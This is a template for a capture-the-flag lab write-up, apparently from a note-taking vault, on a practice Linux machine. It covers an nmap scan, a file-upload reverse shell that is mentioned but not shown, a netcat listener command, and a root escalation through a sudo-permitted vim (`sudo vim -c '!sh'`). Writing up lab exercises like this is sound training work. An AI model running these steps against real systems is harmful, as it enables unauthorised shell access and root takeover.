---
title: Lab Template
difficulty: 🟠Medium
os: 🐧Linux
status: ✅Completed
tags:
  - HTB
  - Enumeration
  - Privilege
  - Escalation
  - Web
  - Exploitation
date: 2025-06-04
---
# 🧪 Lab Report: VulnLab01

## 🎯 Objective
Gain root access and capture the `root.txt` flag.

## 📋 Summary
- Initial Access: Web vulnerability → file upload exploit
- Privilege Escalation: Misconfigured sudo permissions
- Flags captured: `user.txt`, `root.txt`

---

## 🛰️ Reconnaissance

```bash
nmap -sC -sV -oA scan <target>
```

| Port | Service | Version       |
| ---- | ------- | ------------- |
| 80   | HTTP    | Apache 2.4.29 |
| 22   | SSH     | OpenSSH 7.6p1 |
#### Notes
- Found CMS running at `/blog`
## 🔍 Enumeration
- Checked `/robots.txt`: disallowed `/uploads`
- CMS = custom PHP blog → upload vulnerability

#### Tool used
- [[Nmap]]
- [[Gobuster]]
## ⚔️ Exploitation
```bash
# Uploaded reverse shell via image upload`
```
- Shell obtained as `www-data`
- Listener: `nc -lvnp 4444`
## 🔐 Privilege Escalation
```bash
sudo -l
```
#### Found:
```python
User can run /usr/bin/vim as root
```
#### Escalation:
```bash
sudo vim -c '!sh'
```
Now root 🎉

## 🏁 Flags
- `user.txt`: ✅ `HTB{xxxxxxxx}`
- `root.txt`: ✅ `HTB{yyyyyyyy}`
## 🧠 Lessons Learned
- Always check upload paths
- `sudo -l` is gold
- Watch for hidden directories via `gobuster`
## 📎 Attachments
- [[⛓️ Reverse Shells]]
- [[LinPEAS]]
## 🗂 Folder Structure
```
04_Lab_Reports/  
├── _Template.md  
├── VulnLab01.md  
├── HTB_Machine_Bounty.md  
├── THM_BasicPentest.md  
└── Vulnhub_Legacy.md
```